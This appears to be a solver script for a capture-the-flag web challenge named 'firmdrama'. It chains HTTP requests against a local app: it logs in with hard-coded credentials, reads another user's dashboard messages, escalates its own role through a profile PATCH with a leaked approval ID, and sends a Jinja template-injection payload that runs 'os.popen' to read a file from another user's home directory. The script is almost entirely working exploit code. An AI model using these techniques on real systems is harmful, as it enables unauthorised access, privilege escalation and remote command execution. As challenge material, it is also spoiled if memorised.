"""Solve firmdrama through HTTP requests only.

Usage: python3 solver/solve_api_only.py [base_url]
"""

from __future__ import annotations

import json
import re
import sys
from urllib.error import HTTPError
from urllib.request import Request, urlopen


FLAG_PATTERN = re.compile(r"duck\{[a-z]{24}\}")
BASE_URL = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:8080"


def request(method: str, path: str, token: str | None = None, body: dict | None = None, expected: int = 200):
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urlopen(Request(BASE_URL + path, data=data, headers=headers, method=method), timeout=10) as response:
            status, raw = response.status, response.read().decode()
    except HTTPError as error:
        status, raw = error.code, error.read().decode()
    assert status == expected, f"{method} {path}: expected {expected}, got {status}: {raw[:200]}"
    return json.loads(raw) if raw else {}


login = request("POST", "/api/v1/auth/login", body={"username": "thisismike", "password": "mike@123"})
token = login["token"]
user_id = login["user"]["id"]
calendar = request("GET", "/api/v1/bookings/calendar", token)
booking = next(item for item in calendar["bookings"] if item["booking_id"] == 7001)
dashboard_id = booking["dashboard_id"]
dashboard = request("GET", f"/api/v1/dashboards/{dashboard_id}", token)
assert dashboard["owner"]["id"] != user_id

conversation = request("GET", f"/api/v1/dashboards/{dashboard_id}/conversations", token)["conversations"][0]
conversation_id = conversation["conversation_id"]
detail = request("GET", f"/api/v1/dashboards/{dashboard_id}/conversations/{conversation_id}", token)
messages = [request("GET", f"/api/v1/dashboards/{dashboard_id}/conversations/{conversation_id}/messages/{item['message_id']}", token) for item in detail["messages"]]
intermediate = [FLAG_PATTERN.search(item["body"]).group(0) for item in messages if item["sender"]["display_name"] == "Olivia" and FLAG_PATTERN.search(item["body"])]
assert len(intermediate) == 1
approval_match = re.search(r"approval ID: (dleg_[A-Za-z0-9_-]+)", next(item["body"] for item in messages if FLAG_PATTERN.search(item["body"])))
assert approval_match

request("PATCH", f"/api/v1/users/{user_id}/profile", token, {"role_id": 499, "delegation_approval_id": approval_match.group(1)})
request("GET", "/api/v3/dashboard", token)
request("GET", "/api/v2/dashboard", token, expected=404)
request("GET", "/api/v1/dashboard", token)
payload = {"body": "{{ cycler.__init__.__globals__.os.popen('cat /home/olivia/DoNotOpenThisFolder/olivia.txt').read() }}"}
preview = request("POST", "/api/v1/tickets/1001/preview", token, payload)
final = FLAG_PATTERN.search(preview["preview_html"])
assert final and final.group(0) != intermediate[0]
print(json.dumps({"intermediate_flag_found": True, "final_flag_found": True}))
